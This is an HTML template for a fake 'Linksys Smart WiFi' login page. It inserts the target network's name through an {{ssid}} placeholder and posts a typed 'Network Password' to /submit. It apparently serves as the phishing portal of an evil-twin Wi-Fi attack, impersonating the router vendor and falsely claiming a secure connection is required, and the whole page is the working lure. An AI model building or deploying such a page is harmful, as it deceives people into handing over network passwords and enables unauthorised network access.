<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Linksys Smart WiFi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: "Helvetica Neue", Arial, sans-serif;
            background: #2c3e50;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            max-width: 420px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #0066cc 0%, #003d7a 100%);
            padding: 30px;
            text-align: center;
        }
        .logo {
            color: white;
            font-size: 32px;
            font-weight: 300;
            letter-spacing: 3px;
            margin-bottom: 8px;
        }
        .logo-bold {
            font-weight: 700;
        }
        .smart-wifi {
            color: rgba(255,255,255,0.8);
            font-size: 13px;
            letter-spacing: 2px;
        }
        .content {
            padding: 40px 35px;
        }
        .welcome {
            text-align: center;
            margin-bottom: 30px;
        }
        .welcome-title {
            color: #2c3e50;
            font-size: 22px;
            font-weight: 300;
            margin-bottom: 5px;
        }
        .welcome-subtitle {
            color: #7f8c8d;
            font-size: 14px;
        }
        .network-card {
            background: #ecf0f1;
            border-radius: 6px;
            padding: 18px;
            margin-bottom: 25px;
            border-left: 4px solid #0066cc;
        }
        .network-label {
            color: #0066cc;
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 6px;
        }
        .network-name {
            color: #2c3e50;
            font-size: 18px;
            font-weight: 600;
        }
        .form-group {
            margin-bottom: 25px;
        }
        label {
            display: block;
            color: #2c3e50;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 2px solid #dfe6e9;
            border-radius: 4px;
            font-size: 15px;
            transition: all 0.3s;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #0066cc;
            background: #f8f9fa;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #0066cc 0%, #003d7a 100%);
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,102,204,0.3);
        }
        button:active {
            transform: translateY(0);
        }
        .help-text {
            text-align: center;
            margin-top: 20px;
            color: #95a5a6;
            font-size: 12px;
        }
        .footer {
            background: #f8f9fa;
            padding: 20px;
            text-align: center;
            border-top: 1px solid #ecf0f1;
        }
        .footer-text {
            color: #95a5a6;
            font-size: 11px;
        }
        .footer-links {
            margin-top: 8px;
        }
        .footer-link {
            color: #0066cc;
            text-decoration: none;
            font-size: 11px;
            margin: 0 8px;
        }
        .footer-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                LINKSYS<span class="logo-bold"></span>
            </div>
            <div class="smart-wifi">SMART WiFi</div>
        </div>
        <div class="content">
            <div class="welcome">
                <div class="welcome-title">WiFi Authentication</div>
                <div class="welcome-subtitle">Secure connection required</div>
            </div>

            <div class="network-card">
                <div class="network-label">Connected Network</div>
                <div class="network-name">{{ssid}}</div>
            </div>

            <form method="POST" action="/submit">
                <div class="form-group">
                    <label for="password">Network Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter password" required autofocus>
                </div>

                <button type="submit">Connect</button>

                <div class="help-text">
                    Enter the wireless password to access this network
                </div>
            </form>
        </div>
        <div class="footer">
            <div class="footer-text">
                Â© Linksys. All rights reserved.
            </div>
            <div class="footer-links">
                <a href="#" class="footer-link">Privacy</a>
                <span style="color: #ddd;">|</span>
                <a href="#" class="footer-link">Support</a>
            </div>
        </div>
    </div>
</body>
</html>
